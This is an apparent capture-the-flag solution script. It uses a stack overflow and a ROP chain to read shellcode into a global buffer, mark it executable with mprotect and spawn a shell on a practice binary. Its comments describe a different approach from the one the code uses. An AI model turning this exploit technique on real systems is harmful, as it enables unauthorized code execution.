#!/usr/bin/env python3
from pwn import *

"""
Here the exercise can be solved using 2 approaches:
1) Write into the global buffer ARMORY(with READ) a shellcode that opens a shell
 (like the previouse ctf) and then make the memory executable with MPROTECT

2)Write into the global buffer ARMORY the string /bin/bash\x00, and then call EXECVE giving the buffer armory as the string pointer.

In order to solve it i prefered the 2nd approach.

"""
context.binary = elf = ELF('./arsenal', checksec=False)
context.arch = 'amd64'
context.log_level = 'debug'
rop = ROP(elf)

OFFSET = 72

POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
POP_RSI = rop.find_gadget(['pop rsi', 'ret'])[0]
POP_RDX = rop.find_gadget(['pop rdx', 'ret'])[0]
POP_RAX = rop.find_gadget(['pop rax', 'ret'])[0]
SYSCALL = rop.find_gadget(['syscall', 'ret'])[0]
RET     = rop.find_gadget(['ret'])[0]

ARMORY = elf.symbols['armory']
BSS = elf.bss()
MPROTECT = elf.symbols['mprotect']
binsh_text= b"/bin/sh\x00"
shellcode = asm(shellcraft.sh())
armory_addr = elf.sym.armory
page = armory_addr & ~0xfff #page alignment


p = process(elf.path)
#p = remote("offsec.m0lecon.it", 13599)

p.recv()

#--------------- STEP 1 ---------------
# Write a shellcode inside armory 
#  Then call mprotect to enable the execution
#Then set as armory address the nerxt address top be executed
payload = flat(

    b"A"*OFFSET,
     #call read(0, armory, 0x100)
    p64(POP_RAX), p64(0),       # READ syscall ID
    p64(POP_RDI), p64(0),       # 1st arg -> STDIN (da dove prendo l'input)
    p64(POP_RSI), p64(ARMORY),  # 2nd arg -> BSS address where to save it
    p64(POP_RDX), p64(len(shellcode)),     # 3rd arg -> length of the input
    p64(SYSCALL),

    p64(POP_RDI), p64(page),      
    p64(POP_RSI), p64(0x1000), 
    p64(POP_RDX), p64(7),
    p64(MPROTECT),
    p64(armory_addr)

   
)

   
    




payload = payload.ljust(512, b"B") #i fill all the remaing "space" of the vuln read function(the read in the vuln read up to 512) in order to avoid that it CONSUME THE PAYLOAD

payload += bytes(shellcode)   #i add the /bin/sh\ , which is the text that the "call read" will read and save into ARMORY

#log.info(f"PAYLOAD: {payload}")
p.send(payload)
p.recv()
p.interactive()



